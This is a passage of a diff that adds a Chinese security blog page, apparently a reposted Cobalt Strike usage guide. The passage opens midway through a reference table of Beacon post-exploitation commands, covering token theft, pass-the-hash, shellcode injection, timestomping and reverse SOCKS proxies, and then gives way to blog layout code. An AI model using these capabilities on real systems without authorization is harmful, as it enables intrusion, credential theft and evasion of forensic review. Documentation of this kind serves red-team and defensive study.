+    powershell                通过powershell.exe执行命令
+    powershell-import         导入powershell脚本
+    ppid                      为Beacon会话中执行的命令分配父进程
+    printscreen               使用PrintScr方法屏幕截图，可以将其注入至特定进程
+    ps                        显示进程列表
+    psinject                  在特定进程中执行powershell命令
+    pth                       使用Mimikatz哈希传递
+    pwd                       显示当前目录
+    reg                       查询注册表键值
+    remote-exec               在靶机使用psexec、powershell、wmic执行命令
+    rev2self                  恢复为原始令牌
+    rm                        删除文件或目录
+    rportfwd                  新建端口转发，端口转发的流量由CS服务端做中转
+    rportfwd_local            新建端口转发，端口转发的流量先途径CS客户端，再借由CS客户端和服务端已经建立的隧道做流量中转
+    run                       在靶机执行命令 (有输出)
+    runas                     以其他用户身份执行命令
+    runasadmin                以admin权限执行命令
+    runu                      选择特定的父进程执行命令
+    screenshot                屏幕截图，可以将其注入至特定进程
+    screenwatch               每次Beacon check-in进行屏幕截图，直至jobkill将其进程结束，可以将其注入至特定进程
+    setenv                    设置环境变量
+    shell                     通过cmd或shell执行命令
+    shinject                  将shellcode注入进程
+    shspawn                   Spawn process and inject shellcode into it
+    sleep                     设置Beacon的延迟时间（心跳时间）
+    socks                     在靶机开启SOCKS4反向代理，监听端口在C2主机
+    socks stop                停止SOCKS4代理
+    spawn                     派生新的会话
+    spawnas                   派生具有其他用户权限的会话
+    spawnto                   Set executable to spawn processes into
+    spawnu                    选择特定的父进程派生新的会话
+    spunnel                   Spawn and tunnel an agent via rportfwd
+    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd
+    ssh                       使用SSH连接远程主机
+    ssh-key                   使用SSH连接远程主机
+    steal_token               从指定进程中窃取令牌
+    timestomp                 将一个文件的时间戳应用到另一个文件
+    unlink                    与父&#x2F;子Beacon断开会话连接
+    upload                    上传文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_38036918/article/details/122240035">https://blog.csdn.net/m0_38036918/article/details/122240035</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">du8848</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/">http://example.com/2022/05/13/CobaltStrike%E4%BD%BF%E7%94%A8/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">du8848</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/tools/">
+                                    <span class="chip bg-color">tools</span>
+                                </a>
+                            
+                                <a href="/tags/CobaltStrike/">
+                                    <span class="chip bg-color">CobaltStrike</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/05/14/Active-Directory%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2022%E2%80%9326923/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Active Directory域权限提升漏洞(CVE-2022–26923)">
+                        
+                        <span class="card-title">Active Directory域权限提升漏洞(CVE-2022–26923)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-14
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="post-category">
+                                    域权限提升
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
+                    </a>
+                    
+                    <a href="/tags/Active-Directory/">
+                        <span class="chip bg-color">Active Directory</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                        <span class="chip bg-color">域权限提升</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/05/09/F5-BIG-IP-iControl-REST%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87RCE%E6%BC%8F%E6%B4%9E-CVE-2022-1388/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="F5 BIG-IP iControl REST身份验证绕过RCE漏洞(CVE-2022-1388)">
+                        
+                        <span class="card-title">F5 BIG-IP iControl REST身份验证绕过RCE漏洞(CVE-2022-1388)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/F5-BIG-IP/" class="post-category">
+                                    F5 BIG-IP
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                    <a href="/tags/F5-BIG-IP/">
+                        <span class="chip bg-color">F5 BIG-IP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">du8848</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://du8848.github.io/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
